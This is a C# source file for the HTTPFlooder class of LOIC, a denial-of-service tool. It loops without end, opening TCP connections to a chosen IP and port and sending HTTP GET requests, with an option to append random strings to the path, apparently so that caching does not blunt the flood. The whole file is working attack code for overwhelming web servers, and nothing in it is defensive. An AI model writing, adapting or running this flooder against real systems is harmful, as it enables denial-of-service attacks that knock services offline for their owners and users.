using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace LOIC
{
	public class HTTPFlooder
	{
		public ReqState State = ReqState.Ready;

		public int Downloaded { get; set; }
		public int Requested { get; set; }
		public int Failed { get; set; }

		public bool IsFlooding { get; set; }
		public string IP { get; set; }
		public int Port { get; set; }
		public string Subsite { get; set; }
		public int Delay { get; set; }
		public int Timeout { get; set; }
		public bool Resp { get; set; }
        private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();

		private long LastAction;
		private Random rnd = new Random();
        private bool random;
		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };

		public HTTPFlooder(string ip, int port, string subSite, bool resp, int delay, int timeout, bool random)
		{
			this.IP = ip;
			this.Port = port;
			this.Subsite = subSite;
			this.Resp = resp;
			this.Delay = delay;
			this.Timeout = timeout;
            this.random = random;
		}
		public void Start()
		{
			IsFlooding = true; LastAction = Tick();

			tTimepoll = new System.Windows.Forms.Timer();
			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
			tTimepoll.Start();

			var bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		}

        private string RandomString()
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            int size = random.Next(5) + 5;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

		void tTimepoll_Tick(object sender, EventArgs e)
		{
			if (Tick() > LastAction + Timeout)
			{
				Failed++; State = ReqState.Failed;
                tTimepoll.Stop();
                if (IsFlooding)
                {
                    tTimepoll.Start();
                }
			}
		}

		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
                byte[] buf;
                if (random == true)
                {
                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.0{2}{2}{2}", Subsite, RandomString(), Environment.NewLine));
                }
                else
                {
                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", Subsite, Environment.NewLine));
                }
				var host = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					State = ReqState.Ready; // SET STATE TO READY //
					LastAction = Tick();
					byte[] recvBuf = new byte[64];
					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					State = ReqState.Connecting; // SET STATE TO CONNECTING //
					socket.Connect(host);
					socket.Blocking = Resp;
					State = ReqState.Requesting; // SET STATE TO REQUESTING //
					socket.Send(buf, SocketFlags.None);
					State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
					if (Resp) socket.Receive(recvBuf, 64, SocketFlags.None);
					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
                    tTimepoll.Stop();
                    tTimepoll.Start();
					if (Delay > 0) System.Threading.Thread.Sleep(Delay);
				}
			}
			catch { }
			finally { IsFlooding = false; }
		}

		private static long Tick()
		{
			return DateTime.Now.Ticks / 10000;
		}
	}
}
